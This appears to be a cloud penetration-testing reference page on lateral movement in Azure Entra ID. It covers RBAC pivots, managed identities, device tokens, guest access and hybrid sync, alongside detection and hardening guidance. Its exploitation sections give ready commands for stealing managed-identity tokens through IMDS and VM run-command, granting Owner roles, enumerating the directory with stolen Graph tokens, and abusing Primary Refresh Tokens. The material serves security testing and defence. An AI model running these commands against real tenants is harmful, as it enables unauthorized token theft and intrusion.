---
cstg_id: CSTG-AZURE-ENTRA-ID-LATERAL
title: "AZURE Entra Id - Lateral Movement"
provider: azure
service: entra-id
phase: lateral-movement
required_access: assumed-breach
required_permissions:
  - "A foothold identity (user, service principal, or managed identity) with a token; specific moves require edges such as Azure RBAC Owner/Contributor at a scope, device PRT access, VM run-command rights, or cross-tenant guest access"
tools: [az cli, Microsoft Graph PowerShell SDK, ROADtools (roadtx), AADInternals, MicroBurst, AzureHound/BloodHound, Azure Instance Metadata Service (IMDS)]
references:
  - "https://learn.microsoft.com/en-us/entra/identity/managed-identities-azure-resources/how-managed-identities-work-vm"
  - "https://learn.microsoft.com/en-us/azure/role-based-access-control/built-in-roles"
  - "https://learn.microsoft.com/en-us/entra/identity/devices/concept-primary-refresh-token"
  - "https://learn.microsoft.com/en-us/entra/external-id/b2b-fundamentals"
  - "https://learn.microsoft.com/en-us/azure/azure-arc/servers/security-overview"
  - "https://dirkjanm.io/abusing-azure-managed-identities/"
  - "https://github.com/dirkjanm/ROADtools"
license: CC BY-SA 4.0
---

## Summary

Lateral movement in the Entra ID context is the use of one compromised identity or resource to obtain access to other identities, resources, subscriptions, or tenants — without necessarily escalating directory role. Entra ID sits at the centre of three connected planes: the **directory plane** (users/groups/apps), the **Azure resource plane** (ARM subscriptions governed by Azure RBAC, where role assignments reference Entra principals), and the **endpoint/device plane** (Entra-joined devices holding Primary Refresh Tokens). Trust flows between these planes, and between tenants via B2B/guest and multi-tenant applications, create rich lateral paths.

The attacker objective is to pivot: from a directory foothold into Azure subscriptions via RBAC; from a compromised VM/resource into the workload's managed identity; from a managed identity back into the directory; from an Entra-joined device's PRT into the user's cloud sessions; and from one tenant into another via guest access or multi-tenant service principals. This page maps those paths. Escalation of directory role itself is covered in [privilege escalation](../03-privilege-escalation/azure-entra-id-privesc.md).

## Prerequisites

- An authenticated foothold identity with a token, or code execution on an Azure resource (VM, App Service, Function, AKS pod, Automation runbook) that has an assigned managed identity.
- For specific paths: Azure RBAC rights at some scope, VM run-command/extension rights, access to a device's TPM/PRT, or a guest invitation in another tenant.

## Enumeration

```bash
# What can my Entra identity touch on the ARM plane?
az account list --all -o table
az role assignment list --assignee <my-objectId> --all -o table
az resource list -o table

# Identify resources with managed identities (lateral targets)
az vm list --query "[?identity != null].{name:name,identity:identity}" -o json
az webapp list --query "[?identity != null].name" -o tsv
```

```powershell
# Map Entra principals to Azure RBAC and find SPs/MIs with subscription power
Get-MgServicePrincipal -Filter "servicePrincipalType eq 'ManagedIdentity'" -All
```

```bash
# From inside a compromised VM/resource: harvest the managed-identity token via IMDS
curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
# Also request a Graph-scoped token to pivot into the directory plane
curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://graph.microsoft.com/"
```

## Misconfigurations & Findings

- **Over-privileged Azure RBAC** assignments to Entra users/groups/SPs (Owner/Contributor/User Access Administrator at subscription or management-group scope).
- **Managed identities with excessive Graph or ARM permissions** — a compromised VM token becomes a directory or cross-subscription foothold.
- **VMs/resources allowing run-command or extension execution** to principals who can reach IMDS and steal the workload identity.
- **Entra-joined devices** whose PRT can be extracted to mint tokens for the device's user.
- **Guest/B2B over-exposure** — a guest in tenant B can enumerate and sometimes act across the boundary; cross-tenant access settings left permissive.
- **Multi-tenant applications** whose service principal is consented in many tenants, enabling cross-tenant movement if the home app is compromised.
- **Hybrid trust** — on-prem AD connect server (`AAD Connect`/Entra Connect) holding sync credentials bridges on-prem and cloud.

## Exploitation

### Directory foothold to Azure resource plane (RBAC)

If the foothold user/group/SP holds Azure RBAC at a scope, simply operate on those resources. With **Owner** or **User Access Administrator**, assign yourself or a controlled SP additional roles, including across subscriptions in the same tenant.

```bash
az role assignment create --assignee <controlled-sp> --role "Owner" \
  --scope "/subscriptions/<sub-id>"
```

### Resource to managed identity (IMDS theft)

With code execution or run-command rights on a VM/App Service/Function, request tokens from IMDS for ARM and Graph. The stolen token carries the workload identity's permissions across resources and, if the MI has Graph roles, into the directory.

```bash
# Run-command to harvest the token remotely without interactive logon
az vm run-command invoke -g <rg> -n <vm> --command-id RunShellScript \
  --scripts "curl -s -H 'Metadata:true' 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/'"
```

### Managed identity to directory plane

A managed identity that has been granted Graph app roles (e.g. `Directory.Read.All` or escalation-capable roles) lets the stolen MI token enumerate or modify the directory — bridging the resource plane back to Entra.

```bash
GRAPH_TOKEN=$(curl -s -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://graph.microsoft.com/" | jq -r .access_token)
curl -s -H "Authorization: Bearer $GRAPH_TOKEN" "https://graph.microsoft.com/v1.0/users" | jq '.value[].userPrincipalName'
```

### Device PRT abuse (endpoint to cloud sessions)

On an Entra-joined/hybrid-joined endpoint, the Primary Refresh Token (protected by the TPM) can be requested or extracted to mint access/refresh tokens for the signed-in user, moving laterally into that user's cloud sessions and SSO apps.

```text
# Conceptual: derive PRT cookie and exchange for tokens (roadtx / AADInternals primitives)
roadtx prt --prt <prt> --derived-key <key>
roadtx browserprtauth   # use PRT cookie to obtain tokens for any Entra-integrated app
```

### Cross-tenant movement (guest / multi-tenant SP)

A compromised principal that is a **guest** in another tenant, or control of a **multi-tenant application** consented in other tenants, lets the attacker authenticate into those tenants' Graph/resources subject to cross-tenant access policy.

```bash
# Acquire a token scoped to the foreign tenant where the guest exists
az login --tenant <foreign-tenant-id>
az account get-access-token --resource-type ms-graph
```

### Hybrid pivot (Entra Connect server)

Compromise of the Entra Connect / AD Connect sync server exposes the `MSOL_` sync account or the AADConnect database credentials, enabling DCSync on-prem and writeback into the cloud — bridging both directories (overlaps with [persistence](../06-persistence/azure-entra-id-persistence.md)).

## Detection & Logging

- **Entra ID sign-in logs (service principal / managed identity sign-ins)** record managed-identity token issuance and SP authentications; a managed identity authenticating to Graph or from an unexpected resource/IP is a key indicator.
- **Azure Activity Logs** record `Microsoft.Compute/virtualMachines/runCommand/action`, role assignment writes (`Microsoft.Authorization/roleAssignments/write`), and resource access used in lateral movement.
- IMDS token requests are not directly logged by the tenant, but the **subsequent use** of the token (ARM Activity Logs, Graph sign-in for the MI) is observable; correlate token resource and caller IP.
- PRT abuse surfaces in sign-in logs as token issuance with device/PRT claims from anomalous locations; **Defender for Endpoint** can flag PRT/credential theft on the device.
- Cross-tenant authentications appear in both tenants' sign-in logs; **cross-tenant access activity** reports highlight inbound/outbound B2B usage.
- **Microsoft Defender for Cloud** and **Defender for Identity** correlate resource and identity signals for lateral-movement alerts.

## Remediation & Hardening

- Apply **least-privilege Azure RBAC**; avoid subscription/management-group Owner and User Access Administrator for routine principals; use PIM for Azure resource roles.
- Grant **managed identities** only the minimum ARM and Graph permissions; never give workload MIs directory-write or escalation-capable Graph roles.
- Restrict **VM run-command / extension** rights and segment access to IMDS where possible (e.g., metadata firewalling, workload identity federation over MI where appropriate).
- Enforce **device compliance and Conditional Access** to limit PRT abuse; protect TPM-backed keys and enable token protection (sign-in session binding).
- Tighten **cross-tenant access settings** (inbound/outbound B2B), review guests with access reviews, and scrutinise **multi-tenant app** consent.
- Harden the **Entra Connect** server as a Tier-0 asset; protect sync accounts and prefer modern auth/PHS with credential isolation.
- Monitor role-assignment writes, managed-identity Graph usage, and cross-tenant sign-ins.

## Tools

- **az cli** — RBAC enumeration/assignment, VM run-command, token acquisition.
- **Microsoft Graph PowerShell SDK** — directory pivots from stolen tokens.
- **ROADtools (roadtx)** — PRT derivation, token exchange, app-only and cross-tenant auth.
- **AADInternals** — PRT, sync, and hybrid-trust primitives.
- **MicroBurst** — Azure resource/identity lateral-movement scripts.
- **AzureHound/BloodHound** — cross-plane and cross-tenant pathfinding.
- **IMDS** — workload identity token endpoint on Azure resources.

## References

- Microsoft Learn — how managed identities work on Azure VMs
- Microsoft Learn — Azure built-in roles
- Microsoft Learn — Primary Refresh Token concept
- Microsoft Learn — B2B collaboration fundamentals and cross-tenant access
- Microsoft Learn — Azure Arc / connected-machine security overview
- dirkjanm.io — abusing Azure managed identities
- ROADtools project documentation
